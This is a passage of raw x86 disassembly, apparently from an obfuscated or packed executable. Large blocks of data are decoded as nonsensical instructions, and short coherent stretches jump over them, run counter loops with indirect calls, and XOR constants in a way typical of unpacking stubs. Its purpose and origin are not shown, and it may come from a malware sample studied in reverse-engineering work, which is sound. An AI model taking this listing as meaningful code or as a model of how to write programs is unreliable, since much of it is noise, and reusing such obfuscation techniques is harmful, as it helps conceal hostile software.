  404a9f:	mov    DWORD PTR [ecx+edx*1+0x65],edi
  404aa3:	jecxz  0x404ad6
  404aa5:	jl     0x404a2d
  404aa7:	sub    eax,0x10b157ff
  404aac:	sbb    BYTE PTR [ebx+0x66],bh
  404aaf:	dec    ebx
  404ab0:	mov    edi,0xb5cdfe79
  404ab5:	xor    eax,0xc2406cfc
  404aba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404abb:	and    al,0x65
  404abd:	das    
  404abe:	and    ch,BYTE PTR [edi]
  404ac0:	xor    bl,ch
  404ac2:	xor    ah,cl
  404ac4:	mov    fs,WORD PTR [ebp-0x41d5062c]
  404aca:	jnp    0x404a77
  404acc:	xlat   BYTE PTR ds:[ebx]
  404acd:	das    
  404ace:	mov    dl,0xb7
  404ad0:	mov    bl,0xa0
  404ad2:	ficomp WORD PTR [edi-0x75]
  404ad5:	cld    
  404ad6:	aas    
  404ad7:	jnp    0x404aee
  404ad9:	jl     0x404b1d
  404adb:	loop   0x404b0c
  404add:	stc    
  404ade:	imul   ebx,esp,0xffffffcc
  404ae1:	retf   
  404ae2:	inc    ecx
  404ae3:	jmp    0x6acc:0x8b92ac27
  404aea:	mov    cl,0x21
  404aec:	cwde   
  404aed:	adc    DWORD PTR [ebx],eax
  404aef:	jmp    DWORD PTR [ebx]
  404af1:	sti    
  404af2:	sbb    ecx,ebx
  404af4:	mov    WORD PTR [ebp-0x2e8f097d],?
  404afa:	sbb    eax,0x2361ce25
  404aff:	out    0xb2,eax
  404b01:	jo     0x404b09
  404b03:	add    ah,BYTE PTR [ebx+0x57]
  404b06:	xchg   BYTE PTR [eax-0x2ae85788],bl
  404b0c:	cmp    ebp,esi
  404b0e:	test   al,0x92
  404b10:	out    dx,eax
  404b11:	aaa    
  404b12:	pop    es
  404b13:	jns    0x404b2b
  404b15:	mov    esp,0xec6479af
  404b1a:	jmp    0x404b25
  404b1c:	cmc    
  404b1d:	int    0xf2
  404b1f:	or     dl,BYTE PTR [ebp+0x3da0d7c4]
  404b25:	out    dx,al
  404b26:	std    
  404b27:	aam    0x15
  404b29:	in     eax,0xa7
  404b2b:	xchg   esi,eax
  404b2c:	cmc    
  404b2d:	mov    al,ds:0xc680fff9
  404b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b33:	xchg   DWORD PTR [eax+eax*8+0x6d59af79],edi
  404b3a:	sahf   
  404b3b:	xchg   ebx,eax
  404b3c:	pop    eax
  404b3d:	sub    DWORD PTR [edx],ecx
  404b3f:	nop
  404b40:	std    
  404b41:	out    0xda,al
  404b43:	icebp  
  404b44:	adc    eax,0xd671bff7
  404b49:	mov    eax,ds:0x9b57fb2a
  404b4e:	push   esp
  404b4f:	xor    edx,DWORD PTR [edx]
  404b51:	adc    dh,dh
  404b53:	hlt    
  404b54:	test   DWORD PTR [edx],0x37890023
  404b5a:	inc    ecx
  404b5b:	adc    al,0x42
  404b5d:	cmp    eax,0x68fb270a
  404b62:	mov    ds:0x3a653dbd,eax
  404b67:	jge    0x404bdd
  404b69:	cmp    ecx,DWORD PTR [ecx]
  404b6b:	fcmovne st,st(6)
  404b6d:	in     al,dx
  404b6e:	(bad)  
  404b6f:	mov    edi,0x6fe8fa8e
  404b74:	stc    
  404b75:	cwde   
  404b76:	sub    dl,cl
  404b78:	(bad)
  404b7b:	aaa    
  404b7c:	jmp    0x404b71
  404b7e:	xchg   BYTE PTR [eax],cl
  404b80:	xchg   ebp,eax
  404b81:	int3   
  404b82:	out    dx,al
  404b83:	shl    BYTE PTR [eax+0x2e48ac00],cl
  404b89:	dec    ebx
  404b8a:	jno    0x404b1f
  404b8c:	push   esp
  404b8d:	push   0x4ce93c23
  404b92:	xor    bl,cl
  404b94:	dec    ebx
  404b95:	dec    ecx
  404b96:	pop    esi
  404b97:	mov    edx,0x3f40808f
  404b9c:	and    al,0xe9
  404b9e:	outs   dx,DWORD PTR ds:[esi]
  404b9f:	dec    ecx
  404ba0:	call   0x78b7:0x855e3b74
  404ba7:	lock and bl,bh
  404baa:	or     al,0xc3
  404bac:	sub    al,0x80
  404bae:	and    cl,BYTE PTR [esi+0x6090b623]
  404bb4:	sub    al,BYTE PTR [edi]
  404bb6:	stc    
  404bb7:	xor    eax,0x56594d6f
  404bbc:	dec    ebp
  404bbd:	push   DWORD PTR [edx-0x29]
  404bc0:	test   DWORD PTR [eax],edx
  404bc2:	cmp    ebx,eax
  404bc4:	dec    ebp
  404bc5:	mov    eax,0x7dcc72f8
  404bca:	dec    ecx
  404bcb:	loopne 0x404c01
  404bcd:	jmp    0xf282:0x3f8bc3cc
  404bd4:	test   ecx,0xfdab0526
  404bda:	mov    ecx,0x51f5aab1
  404bdf:	scas   eax,DWORD PTR es:[edi]
  404be0:	lods   eax,DWORD PTR ds:[esi]
  404be1:	enter  0x19d6,0x75
  404be5:	mov    edi,0x54f130f4
  404bea:	loopne 0x404c4c
  404bec:	xchg   edx,eax
  404bed:	mov    ds:0x2c6c49a7,eax
  404bf2:	jbe    0x404beb
  404bf4:	fcmovnb st,st(5)
  404bf6:	shl    ebx,1
  404bf8:	push   0x92947503
  404bfd:	push   es
  404bfe:	repnz mov es,WORD PTR [ecx]
  404c01:	stc    
  404c02:	pop    es
  404c03:	mov    ch,0xdc
  404c05:	ja     0x404c5d
  404c07:	sbb    eax,0xb4f677cf
  404c0c:	sub    bh,BYTE PTR [ebx]
  404c0e:	xor    BYTE PTR [ecx+0x58f1bb3f],al
  404c14:	dec    eax
  404c15:	cmp    dh,ch
  404c17:	add    al,0x5
  404c19:	(bad)  
  404c1a:	in     eax,dx
  404c1b:	add    bh,dl
  404c1d:	cld    
  404c1e:	ss push cs
  404c20:	push   esp
  404c21:	je     0x404be6
  404c23:	hlt    
  404c24:	lods   al,BYTE PTR ds:[esi]
  404c25:	rol    BYTE PTR [ecx+0x73],cl
  404c28:	out    0x4a,al
  404c2a:	in     eax,0x86
  404c2c:	mov    ebp,0x97a0ffbf
  404c31:	or     BYTE PTR ds:0xa13d9b21,cl
  404c37:	xor    BYTE PTR [ecx],al
  404c39:	mov    al,BYTE PTR [ebp-0x16739135]
  404c3f:	out    dx,al
  404c40:	mov    cl,0xf
  404c42:	jb     0x404cae
  404c44:	cwde   
  404c45:	(bad)  
  404c46:	xchg   DWORD PTR [esi+0x1],eax
  404c49:	ror    esp,cl
  404c4b:	fs xchg esp,eax
  404c4d:	ds mov edx,0x367e86c7
  404c53:	mov    esp,0xcdf4c638
  404c58:	dec    eax
  404c59:	bound  edx,QWORD PTR [edx-0x40]
  404c5c:	inc    ebp
  404c5d:	mov    ch,BYTE PTR [ecx+0x7720e9f3]
  404c63:	(bad)  
  404c64:	out    dx,al
  404c65:	add    eax,0x49ed49f1
  404c6a:	mov    bl,0x53
  404c6c:	adc    BYTE PTR [esi+0x7475f001],ah
  404c72:	cmp    al,0xa0
  404c74:	inc    ebp
  404c75:	adc    cl,BYTE PTR [ecx-0x6c87fef3]
  404c7b:	dec    esi
  404c7c:	or     al,0xe3
  404c7e:	cdq    
  404c7f:	in     al,0xfe
  404c81:	xchg   ecx,eax
  404c82:	js     0x404c0e
  404c84:	mov    DWORD PTR [eax+ebx*1-0x1b3cc5e6],ecx
  404c8b:	mov    al,0xc2
  404c8d:	ret    
  404c8e:	jae    0x404cbd
  404c90:	icebp  
  404c91:	mov    DWORD PTR [ebp+0x6e838a1f],edi
  404c97:	dec    ebx
  404c98:	mov    edx,0x35169fd1
  404c9d:	pop    edi
  404c9e:	and    edi,DWORD PTR [ebx-0x4f635458]
  404ca4:	hlt    
  404ca5:	xor    DWORD PTR ds:0xc11dd180,ecx
  404cac:	outs   dx,BYTE PTR ds:[esi]
  404cad:	test   eax,0xa805d147
  404cb2:	adc    DWORD PTR [eax],edi
  404cb4:	cld    
  404cb5:	repnz int3 
  404cb7:	mov    bh,dl
  404cb9:	push   esp
  404cba:	dec    ecx
  404cbb:	and    ebp,0xeae3552a
  404cc1:	cwde   
  404cc2:	mov    esp,0xa1a4bb7f
  404cc7:	jmp    0xcc2b7d5f
  404ccc:	push   DWORD PTR [ecx-0x12]
  404ccf:	outs   dx,BYTE PTR ds:[esi]
  404cd0:	mov    ebp,0x81c09052
  404cd5:	sar    DWORD PTR [edx+edi*8-0x2a339088],0xe7
  404cdd:	nop
  404cde:	call   0x55f2:0xc8aa2cc5
  404ce5:	mov    bh,0x7c
  404ce7:	dec    ecx
  404ce8:	clc    
  404ce9:	mov    ch,0xdc
  404ceb:	pop    ss
  404cec:	and    ebx,edi
  404cee:	xchg   ecx,eax
  404cef:	mov    al,ds:0x3dbe5e05
  404cf4:	loope  0x404ce8
  404cf6:	or     bl,0x58
  404cf9:	add    al,0xf8
  404cfb:	imul   ebp,DWORD PTR [edi+esi*2-0x1fc70206],0x2b
  404d03:	and    eax,0x823abc61
  404d08:	jno    0x404d1d
  404d0a:	add    BYTE PTR [ecx],0x38
  404d0d:	pushf  
  404d0e:	or     BYTE PTR [ebx+0x3b],ch
  404d11:	arpl   dx,ax
  404d13:	dec    ecx
  404d14:	enter  0xac38,0xfe
  404d18:	xor    BYTE PTR [ebp+0x4f],0xc2
  404d1c:	sub    al,0x94
  404d1e:	xchg   ebx,ebp
  404d20:	xchg   edx,eax
  404d21:	cld    
  404d22:	test   eax,0x9a75e283
  404d27:	fimul  WORD PTR [ecx]
  404d29:	add    edx,DWORD PTR [ebp+0x2b]
  404d2c:	mov    dl,BYTE PTR [ecx]
  404d2e:	push   ebp
  404d2f:	loope  0x404d6d
  404d31:	in     al,0xfa
  404d33:	cmp    al,bl
  404d35:	sbb    eax,0x4d8bf1f7
  404d3a:	adc    BYTE PTR [ebx],ah
  404d3c:	enter  0xc981,0x8f
  404d40:	sbb    eax,0xc18b8116
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0xdfd20631
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404d22
  404d6a:	or     BYTE PTR [ebp*8-0x7911aafc],dl
  404d71:	mov    eax,ds:0x3ab9a359
  404d76:	xchg   edx,eax
  404d77:	cmp    cl,BYTE PTR [ebx-0xc]
  404d7a:	aam    0xc4
  404d7c:	retf   
  404d7d:	xor    al,BYTE PTR [edx-0x6f07a89e]
  404d83:	or     DWORD PTR [edx],edx
  404d85:	pop    eax
  404d86:	xor    ebx,DWORD PTR [edx]
  404d88:	inc    edi
  404d89:	(bad)  
  404d8a:	pop    ebp
  404d8b:	mov    ds:0xcb4d3e40,al
  404d90:	xchg   edi,eax
  404d91:	out    0x51,eax
  404d93:	inc    esi
  404d94:	int3   
  404d95:	sbb    eax,0x585426fd
  404d9a:	and    esp,ecx
  404d9c:	jmp    0x974:0x9cd42be6
  404da3:	js     0x404d99
  404da5:	in     eax,dx
  404da6:	outs   dx,DWORD PTR ds:[esi]
  404da7:	mov    ebp,0xb06d8e68
  404dac:	push   esp
  404dad:	lahf   
  404dae:	inc    edx
  404daf:	push   es
  404db0:	in     al,dx
  404db1:	cmp    BYTE PTR [ecx+esi*1],dh
  404db4:	jp     0x404e09
  404db6:	jge    0x404dd2
  404db8:	and    esi,DWORD PTR [esi]
  404dba:	xor    bh,BYTE PTR [esi+0x2a]
  404dbd:	or     BYTE PTR [esi],bl
  404dbf:	lock sub al,0xdc
  404dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dc3:	cmp    BYTE PTR [ebp-0x74],ah
  404dc6:	jae    0x404d4a
  404dc8:	dec    edi
  404dc9:	xchg   DWORD PTR ds:0x30c8c102,edi
  404dcf:	fst    st(6)
  404dd1:	or     BYTE PTR [edx],0xe0
  404dd4:	fidiv  WORD PTR [esp+ecx*4]
  404dd7:	cmp    al,0xd5
  404dd9:	add    eax,0xf619fe74
  404dde:	or     DWORD PTR [ebx+0xf],ecx
  404de1:	adc    bh,BYTE PTR [ebx+eax*1+0x3a]
  404de5:	test   DWORD PTR [edx+0x38e23987],0x5f3b1bc4
  404def:	mov    eax,ds:0x33bae62c
  404df4:	adc    dl,dl
  404df6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404df7:	pop    es
  404df8:	lea    esi,[ecx-0x39cfa7c5]
  404dfe:	mov    al,al
  404e00:	mov    bh,BYTE PTR [esi+edi*4+0x1d]
  404e04:	in     al,0xd7
  404e06:	add    BYTE PTR [ebp+0x7f],0xfa
  404e0a:	in     al,0x75
  404e0c:	and    DWORD PTR [ebx],esp
  404e0e:	cmp    DWORD PTR [esi-0x25],eax
  404e11:	outs   dx,DWORD PTR ds:[esi]
  404e12:	push   eax
  404e13:	jo     0x404e56
  404e15:	adc    BYTE PTR [edx+0x1be6edd],ch
  404e1b:	sub    dh,dh
  404e1d:	xor    DWORD PTR [edx+0x6b],edi
  404e20:	jl     0x404e6d
  404e22:	pop    edi
  404e23:	cwde   
  404e24:	fwait
  404e25:	mov    esp,0x4e96f28b
  404e2a:	or     edi,DWORD PTR [eax-0x4f]
  404e2d:	shl    ebp,0xd3
  404e30:	jne    0x404eb0
  404e32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e33:	fmul   st,st(2)
  404e35:	adc    al,0x81
  404e37:	mov    ebx,0x587c0e4e
  404e3c:	into   
  404e3d:	adc    BYTE PTR [esi],al
  404e3f:	mov    cl,0xad
  404e41:	sub    DWORD PTR [edi-0x75],edx
  404e44:	and    eax,0xb897abc1
  404e49:	popa   
  404e4a:	(bad)  
  404e4b:	jmp    0xd7bdfc8c
  404e50:	and    DWORD PTR [edi],esi
  404e52:	jg     0x404e84
  404e54:	adc    edi,DWORD PTR [eax]
  404e56:	xor    eax,0x13a8d3d6
  404e5b:	clc    
  404e5c:	jae    0x404e86
  404e5e:	jg     0x404e8d
  404e60:	jno    0x404e5b
  404e62:	inc    ebx
  404e63:	dec    ebp
  404e64:	lock outs dx,DWORD PTR ds:[esi]
  404e67:	fnstcw WORD PTR [edx-0x14]
  404e6a:	ret    
  404e6b:	repnz sub DWORD PTR [edi-0x55],eax
  404e6f:	push   ebp
  404e70:	ret    0x4689
  404e73:	retf   
  404e74:	leave  
  404e75:	mov    ebp,0x4bdc6c00
  404e7a:	fnsave ds:0x44c39d71
  404e80:	out    0x5a,eax
  404e82:	rcr    DWORD PTR [ecx],0x9f
  404e85:	and    ebx,ebx
  404e87:	mov    BYTE PTR [ebp+0x586e71ca],0xdc
  404e8e:	test   al,0x4a
  404e90:	retf   0xe38c
  404e93:	sub    eax,0xe19804ae
  404e98:	dec    edx
  404e99:	adc    DWORD PTR ds:0xc2f64e96,0x50f2b114
  404ea3:	add    BYTE PTR [esi+0x1e],bl
  404ea6:	ins    BYTE PTR es:[edi],dx
  404ea7:	shl    DWORD PTR [eax+0x25cf5772],0x10
  404eae:	and    cl,BYTE PTR ds:0x4227d177
  404eb4:	xchg   edi,eax
  404eb5:	or     bl,BYTE PTR [edi+0x73]
  404eb8:	jecxz  0x404e9a
  404eba:	dec    eax
  404ebb:	and    esp,0xb992746e
  404ec1:	push   ebp
  404ec2:	sahf   
  404ec3:	scas   al,BYTE PTR es:[edi]
  404ec4:	mov    ds:0x62993fe5,al
  404ec9:	call   0x4c70:0xda4e9827
  404ed0:	sub    al,0xfd
  404ed2:	fidiv  WORD PTR [ebp+0x601cac47]
  404ed8:	sub    DWORD PTR [ecx+0x75],ebx
  404edb:	ins    DWORD PTR es:[edi],dx
  404edc:	dec    esi
  404edd:	inc    ebx
  404ede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404edf:	push   esp
  404ee0:	mov    bh,0x79
  404ee2:	lock jmp 0xf4dd:0x5dad5686
  404eea:	push   edx
  404eeb:	cld    
  404eec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eed:	test   DWORD PTR [ebx+eiz*1+0x7949a26f],ebp
  404ef4:	popa   
  404ef5:	rcr    al,cl
  404ef7:	push   ebp
  404ef8:	aam    0x3f
  404efa:	pop    ecx
  404efb:	push   esi
  404efc:	or     eax,0xc8751c2
  404f01:	pusha  
  404f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f03:	aas    
  404f04:	retf   
  404f05:	outs   dx,BYTE PTR ds:[esi]
  404f06:	in     al,dx
  404f07:	fs (bad) 
  404f09:	jmp    0x83ec:0xeb14104
  404f10:	push   ss
  404f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f12:	call   0x9189:0x4f4487c2
  404f19:	jo     0x404ee7
  404f1b:	mov    ch,0xc2
  404f1d:	xchg   esi,eax
  404f1e:	jl     0x404f19
  404f20:	sbb    BYTE PTR [ebp+0x4dc01565],bl
  404f26:	mov    WORD PTR [ecx-0x443ee2f4],fs
  404f2c:	icebp  
  404f2d:	data16 (bad) 
  404f2f:	push   ds
  404f30:	xor    eax,0x6ebc27c1
  404f35:	pop    edi
  404f36:	dec    ebp
  404f37:	cmp    eax,0xb140d2a9
  404f3c:	pushf  
  404f3d:	adc    al,BYTE PTR ds:0xd5bdae93
  404f43:	mov    edx,0x6984dd0b
  404f48:	pop    DWORD PTR [ebx+0xb]
  404f4b:	adc    dh,BYTE PTR [ebp-0x7f415314]
  404f51:	dec    ebx
  404f52:	(bad)  
  404f54:	js     0x404f4e
  404f56:	pop    eax
  404f57:	inc    ebp
  404f58:	out    dx,eax
  404f59:	push   ecx
  404f5a:	and    DWORD PTR ds:0x430459,0x0
  404f64:	jmp    0x404f74
  404f69:	mov    eax,ds:0x430459
  404f6e:	inc    eax
  404f6f:	mov    ds:0x430459,eax
  404f74:	cmp    DWORD PTR ds:0x430459,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x430459,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e7d4
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42ea9f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42edd7
  404faf:	xor    edx,DWORD PTR ds:0x430451
  404fb5:	mov    DWORD PTR ds:0x42edd7,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ee69
  404fc8:	mov    eax,ds:0x42e983
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e7d8
  404fdc:	sub    ecx,DWORD PTR ds:0x43044d
  404fe2:	mov    DWORD PTR ds:0x42e7d8,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42edf3,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42edf3
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42edf3,ecx
  405002:	cmp    DWORD PTR ds:0x42edf3,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e9d3
  405018:	cmp    DWORD PTR ds:0x42edf3,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42edf3
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42edf3,ecx
  405034:	cmp    DWORD PTR ds:0x42edf3,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	add    eax,0xd639045c
  405057:	cs jle 0x4050d8
  40505a:	outs   dx,BYTE PTR ds:[esi]
  40505b:	jg     0x4050db
  40505d:	jle    0x4050bc
  40505f:	pop    esi
  405060:	sub    BYTE PTR [edx],al
  405062:	sti    
  405063:	cdq    
  405064:	and    BYTE PTR [esp+ebp*2+0x2f],cl
  405068:	pop    edi
  405069:	sub    ah,dl
  40506b:	mov    dl,0x20
  40506d:	dec    edi
  40506e:	out    0x8a,eax
  405070:	push   ss
  405071:	add    DWORD PTR [ecx+ebx*1],0x278edb80
  405078:	fwait
  405079:	xor    eax,0xdf4fac81
  40507e:	xchg   esp,eax
  40507f:	or     al,0x45
  405081:	into   
  405082:	pop    ecx
  405083:	push   esp
  405084:	test   DWORD PTR [ebp-0x630b603c],esi
  40508a:	fdivr  QWORD PTR [eax+0x4b]
  40508d:	push   ecx
  40508e:	dec    edx
  40508f:	sbb    DWORD PTR [esi-0x14a36f0d],eax
  405095:	jmp    0x9b1c:0x8d3d8229
  40509c:	xchg   esi,eax
  40509d:	scas   eax,DWORD PTR es:[edi]
  40509e:	mov    esp,0xb8479c4c
  4050a3:	rcr    BYTE PTR [edi-0x41],0xdd
  4050a7:	add    al,0x83
  4050a9:	and    ebp,DWORD PTR [eax]
  4050ab:	xlat   BYTE PTR ds:[ebx]
  4050ac:	sub    eax,ebp
  4050ae:	mov    ebx,0xffaa8068
  4050b3:	imul   ebx,DWORD PTR [ebp+0x61],0x9aa9c4ea
  4050ba:	adc    eax,0xf7c0c18c
  4050bf:	loop   0x4050a1
  4050c1:	sbb    esp,DWORD PTR [ecx+0x62]
  4050c4:	jnp    0x405080
  4050c6:	retf   
  4050c7:	in     al,dx
  4050c8:	push   edi
  4050c9:	inc    eax
  4050ca:	mov    dl,0xc2
  4050cc:	inc    ecx
  4050cd:	cmp    dh,al
  4050cf:	jnp    0x4050ce
  4050d1:	inc    ebx
  4050d2:	mov    esi,0xd503886b
  4050d7:	dec    ebp
  4050d8:	fcom   DWORD PTR [edx+edx*1]
  4050db:	jno    0x40511d
  4050dd:	cmp    edi,esp
  4050df:	sti    
  4050e0:	sti    
  4050e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050e2:	mov    ebp,esi
  4050e4:	dec    esi
  4050e5:	pop    edi
  4050e6:	lods   eax,DWORD PTR ds:[esi]
  4050e7:	sub    cl,BYTE PTR [edi]
  4050e9:	push   edx
  4050ea:	sub    eax,0x237c97ae
  4050ef:	mov    ecx,0xae736cb3
  4050f4:	or     bh,dl
  4050f6:	test   al,0x8a
  4050f8:	push   edx
  4050f9:	and    cl,BYTE PTR [eax+0x74eb9d22]
  4050ff:	stos   BYTE PTR es:[edi],al
  405100:	push   0x8
  405102:	(bad)  
  405103:	(bad)  
  405104:	outs   dx,DWORD PTR ds:[esi]
  405105:	mov    esp,DWORD PTR [ebp+0x4]
  405108:	xor    DWORD PTR [edx-0x5b],ebx
  40510b:	xchg   ah,bl
  40510d:	ret    
  40510e:	cwde   
  40510f:	retf   
  405110:	or     DWORD PTR [edi-0x7dd28fc6],edx
  405116:	ins    BYTE PTR es:[edi],dx
  405117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405118:	jg     0x40510b
  40511a:	add    al,0x52
  40511c:	out    dx,al
  40511d:	or     al,0xd9
  40511f:	das    
  405120:	jp     0x40517c
  405122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405123:	fidiv  DWORD PTR [eax]
  405125:	mov    ah,0x72
  405127:	xor    DWORD PTR [eax],ecx
  405129:	mov    cl,0x1d
  40512b:	out    0x82,al
  40512d:	aad    0xe1
  40512f:	loope  0x405134
  405131:	iret   
  405132:	adc    dh,BYTE PTR [eax-0x27]
  405135:	sbb    ecx,DWORD PTR [ecx+0x4a473a58]
  40513b:	mov    ebx,fs
  40513d:	sub    dh,BYTE PTR [ecx]
  40513f:	dec    esp
  405140:	aam    0xf2
  405142:	sub    DWORD PTR [edx+0x2db0de43],0xffffffff
  405149:	cs pop ebx
  40514b:	adc    al,0xa4
  40514d:	add    DWORD PTR [ebp-0x71a0ff51],ebx
  405153:	pop    ds
  405154:	or     al,bh
  405156:	inc    ecx
  405157:	int    0xf3
  405159:	dec    ebx
  40515a:	xchg   ebx,eax
  40515b:	les    edx,FWORD PTR [edi*1-0x1d964cac]
  405162:	sti    
  405163:	rcr    DWORD PTR [edx-0x7cb9d3],0x1
  40516a:	cdq    
  40516b:	push   0x90bf84eb
  405170:	push   cs
  405171:	cld    
  405172:	cmp    eax,0xaf06f8d9
  405177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405178:	rcr    BYTE PTR [ebx-0x30],0x19
  40517c:	cmp    eax,0x6c0d169d
  405181:	jns    0x405114
  405183:	in     al,dx
  405184:	in     eax,0x74
  405186:	pop    eax
  405187:	xchg   ebx,eax
  405188:	xor    eax,ebx
  40518a:	sbb    cl,ch
  40518c:	pop    es
  40518d:	arpl   WORD PTR [esi],ax
  40518f:	jns    0x405191
  405191:	xchg   edi,eax
  405192:	(bad)  
  405193:	mov    edi,0xfe96102a
  405198:	jo     0x4051e8
  40519a:	mov    dl,BYTE PTR [edi]
  40519c:	and    dh,BYTE PTR [edi]
  40519e:	enter  0xbf82,0x8
  4051a2:	sbb    al,0xa2
  4051a4:	jmp    0x9129:0xc134a109
  4051ab:	scas   eax,DWORD PTR es:[edi]
  4051ac:	cmp    DWORD PTR [ebp+0x16],eax
  4051af:	xor    esp,ebx
  4051b1:	aam    0xd2
  4051b3:	or     BYTE PTR [ebx-0x39],cl
  4051b6:	jl     0x405182
  4051b8:	ret    0xdc6d
  4051bb:	fstp   QWORD PTR [eax+0x32]
  4051be:	push   es
  4051bf:	daa    
  4051c0:	outs   dx,BYTE PTR ds:[esi]
  4051c1:	in     al,dx
  4051c2:	fadd   DWORD PTR [ebp*4-0x69f97ec2]
  4051c9:	int    0xd3
  4051cb:	out    0x12,eax
  4051cd:	ss sub edi,edi
  4051d0:	scas   al,BYTE PTR es:[edi]
  4051d1:	pop    ecx
  4051d2:	pop    esp
  4051d3:	jg     0x405176
  4051d5:	fdivr  QWORD PTR [edx+ecx*4+0x3c715f1f]
  4051dc:	xor    eax,0x6316415a
  4051e1:	pop    eax
  4051e2:	mov    ch,0x5d
  4051e4:	lock mov edx,?
  4051e7:	(bad)  
  4051e8:	cmp    bh,cl
  4051ea:	or     BYTE PTR [esi-0x4b],ch
  4051ed:	(bad)  
  4051ee:	fsubr  st,st(1)
  4051f0:	(bad)  [edx+ebp*8-0x2810d73]
  4051f7:	push   0x350f8474
  4051fc:	pop    es
  4051fd:	out    dx,al
  4051fe:	fldcw  WORD PTR [eax+0x350faba1]
  405204:	mov    ch,0xa5
  405206:	mov    ds:0x370857a1,eax
  40520b:	xchg   edx,eax
  40520c:	pop    ebx
  40520d:	leave  
  40520e:	sub    DWORD PTR [esp+esi*4],0xca033ae1
  405215:	mov    dh,0x17
  405217:	or     ah,BYTE PTR [eax-0x5bf5ff3f]
  40521d:	dec    ebp
  40521e:	sahf   
  40521f:	jl     0x405294
  405221:	(bad)  
  405222:	je     0x4051eb
  405224:	adc    DWORD PTR [eax],esp
  405226:	fs jl  0x4051dd
  405229:	xchg   edi,eax
  40522a:	mov    ebx,0x716b9a29
  40522f:	in     al,0x78
  405231:	jnp    0x4051e5
  405233:	imul   BYTE PTR [ebp+0x78]
  405236:	test   DWORD PTR [esi-0x31],edx
  405239:	pop    ecx
  40523a:	mov    BYTE PTR [edi+ecx*1],cl
  40523d:	add    BYTE PTR [ecx],dl
  40523f:	cmp    al,0x4d
  405241:	fiadd  DWORD PTR ds:0xfe43dac6
  405247:	sub    al,0x56
  405249:	mov    ecx,0x7ba7bcfb
  40524e:	mov    ecx,0x7510854
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	push   edi
  40527d:	pop    edi
  40527e:	jp     0x4052a5
  405280:	(bad)  
  405281:	sub    al,0x7e
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x40529e
  405289:	pop    ss
  40528a:	mov    edx,DWORD PTR [eax]
  40528c:	dec    ebp
  40528d:	fstp   QWORD PTR [ebp+0x3851617]
  405293:	xchg   ebx,eax
  405294:	loopne 0x40530c
  405296:	mov    bh,0xc5
  405298:	and    eax,0x5bc2ad1
  40529d:	dec    esp
  40529e:	dec    eax
  40529f:	cs ins DWORD PTR es:[edi],dx
  4052a1:	xchg   ecx,eax
  4052a2:	sbb    eax,0x3623f296
  4052a7:	adc    dl,BYTE PTR [edx+0x64]
  4052aa:	repz imul esi,DWORD PTR [ebx+0xa],0xffffffd3
  4052af:	test   BYTE PTR [ebp-0x3e66870a],dh
  4052b5:	push   esi
  4052b6:	cmp    al,0xf6
  4052b8:	cmp    al,0xa9
  4052ba:	jl     0x4052ac
  4052bc:	adc    al,0x25
  4052be:	or     bh,cl
  4052c0:	retf   0x41fa
  4052c3:	and    al,0x87
  4052c5:	aam    0x8
